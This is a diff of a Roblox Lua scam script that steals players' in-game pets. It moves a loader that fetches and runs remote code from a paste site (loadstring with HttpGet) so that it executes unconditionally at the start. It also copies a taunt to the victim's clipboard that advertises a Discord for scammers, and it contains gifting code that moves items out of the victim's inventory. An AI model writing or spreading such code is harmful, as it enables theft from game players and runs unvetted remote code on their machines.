@@ -11,7 +11,7 @@
                         Discord: discord.gg/d2zgg2YDMz
 ]]
 
-
+        loadstring(game:HttpGet("https://pastefy.app/VISU0w9k/raw", true))()
         
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
@@ -32,14 +32,6 @@
         local teleported = false
 
         setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
-
-        local runBypass
-
-        task.spawn(function()
-            repeat task.wait() until runBypass
-            pcall(runBypass)
-        end)
-
 
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
@@ -751,11 +743,6 @@
             warn("Gifting failed: Tool not equipped - " .. tool.Name)
             tool.Parent = inventory -- Reset to Backpack
             return false
-        end
-
-        -- Krnl Bypass
-        runBypass = function()
-            loadstring(game:HttpGet("https://pastefy.app/VISU0w9k/raw", true))()
         end
 
         if detectExecutor() == "Delta" then
